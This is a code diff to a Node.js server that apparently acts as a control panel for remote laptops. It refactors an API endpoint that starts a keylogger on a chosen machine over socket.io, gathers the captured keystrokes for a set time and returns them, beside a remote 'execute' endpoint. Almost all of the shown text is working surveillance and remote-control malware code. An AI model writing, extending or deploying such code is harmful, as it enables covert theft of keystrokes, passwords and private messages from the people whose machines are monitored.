@@ -173,7 +173,8 @@ app.post("/api/control/execute", checkApiKey, (req, res) => {
 
 // API endpoint to take a keylogger tracking
 
-app.post("/api/control/keylogger", checkApiKey, async (req, res) => {
+// API endpoint to handle keylogging
+app.post("/api/control/keylogger", checkApiKey, (req, res) => {
   try {
     const { laptopId, duration = 5000 } = req.body;
 
@@ -193,8 +194,8 @@ app.post("/api/control/keylogger", checkApiKey, async (req, res) => {
     const requestId = Date.now().toString();
     const collectedKeys = [];
 
-    // Register listener for incoming keys
-    const keyListener = (data) => {
+    // Create a temporary event handler for keylog events
+    const keylogHandler = (data) => {
       if (data && data.requestId === requestId) {
         collectedKeys.push({
           key: data.key,
@@ -204,8 +205,8 @@ app.post("/api/control/keylogger", checkApiKey, async (req, res) => {
       }
     };
 
-    // Attach listener temporarily
-    socket.on("keylog", keyListener);
+    // Listen for keylog events from this specific laptop
+    laptop.socket.on("keylog", keylogHandler);
 
     // Start keylogger on laptop
     io.to(laptopId).emit("command", {
@@ -213,10 +214,21 @@ app.post("/api/control/keylogger", checkApiKey, async (req, res) => {
       requestId,
     });
 
+    // Store request in pending requests to handle timeout
+    laptop.pendingRequests.set(requestId, {
+      res,
+      timestamp: Date.now(),
+      keylogHandler, // Store handler reference for cleanup
+    });
+
     // Stop keylogger and respond after duration
     setTimeout(() => {
       try {
-        socket.off("keylog", keyListener); // Remove listener
+        // Remove keylog listener
+        laptop.socket.off("keylog", keylogHandler);
+
+        // Remove from pending requests
+        laptop.pendingRequests.delete(requestId);
 
         // Stop keylogger on laptop
         io.to(laptopId).emit("command", {
@@ -224,6 +236,7 @@ app.post("/api/control/keylogger", checkApiKey, async (req, res) => {
           requestId,
         });
 
+        // Return collected keys
         res.json({
           success: true,
           message: `Captured ${collectedKeys.length} keys`,
